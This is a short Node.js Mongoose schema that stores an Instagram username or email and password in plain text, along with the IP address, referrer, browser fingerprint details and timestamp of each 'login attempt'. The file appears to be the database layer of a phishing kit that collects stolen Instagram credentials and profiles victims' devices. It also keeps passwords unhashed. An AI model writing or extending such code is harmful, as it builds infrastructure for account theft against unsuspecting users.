
const mongoose = require('mongoose');

// Define user schema for storing login credentials and device information
const UserSchema = new mongoose.Schema({
  username: String,          // Instagram username or email
  password: String,          // User's password
  userAgent: String,         // Browser's user agent string
  language: String,          // User's preferred language
  platform: String,          // Operating system platform
  screenResolution: String,  // Screen resolution details
  timeZone: String,         // User's timezone
  timestamp: Date,          // When the login attempt was made
  referrer: String,         // Where the user came from
  cookiesEnabled: Boolean,   // If browser cookies are enabled
  ipAddress: String,        // User's IP address
  createdAt: { type: Date, default: Date.now }  // Record creation timestamp
});

module.exports = mongoose.model('User', UserSchema);
